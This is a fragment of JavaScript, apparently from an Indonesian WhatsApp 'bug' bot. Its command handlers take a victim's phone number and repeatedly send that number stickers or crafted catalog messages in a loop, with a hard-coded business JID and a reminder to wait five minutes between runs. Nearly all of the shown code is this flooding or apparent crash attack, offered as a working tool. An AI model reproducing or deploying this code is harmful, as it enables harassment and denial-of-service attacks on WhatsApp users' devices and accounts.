...
//=====================================================//
ppuser = 'https://raw.githubusercontent.com/ruslanizy/mabarff/master/sanmods.jpg'
...
if (!text) return 
num = `${text}`+'@s.whatsapp.net'
let ceknom = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (ceknom.length == 0) return reply(`Masukan Nomer Yang Valid Yang Terdaftar Di WhatsApp`)
txts = `*Sukses Mengirim ${command}*\n*Ke Nomer : @${sender.split("@")[0]}*\n*Jangan Lupa Jeda 5 Menit*`
reply(txts)
jumlah = `${jumlahbugtext}`
for (let i = 0; i < jumlah; i++) {
xd.sendMessage(num, {sticker: ppnyauser, mentions:[sender]},{ quoted: stick })
await sleep(2000)
}}
break
//=====================================================//
...
if (!text) return 
num = `${text}`+'@s.whatsapp.net'
let ceknm = await xd.onWhatsApp(num + `@s.whatsapp.net`)
if (ceknm.length == 0) return reply(`Masukan Nomer Yang Valid Yang Terdaftar Di WhatsApp`)
txts = `*Sukses Mengirim ${command}*\n*Ke Nomer : @${sender.split("@")[0]}*\n*Jangan Lupa Jeda 5 Menit*`
reply(txts)
jumlah = `${jumlahbugtext}`
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: xd.waUploadToServer })
...
"businessOwnerJid": "6285793433348@s.whatsapp.net",
}
}), { userJid: from, quoted: stick })
xd.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(2000)
}}
break
//=====================================================//
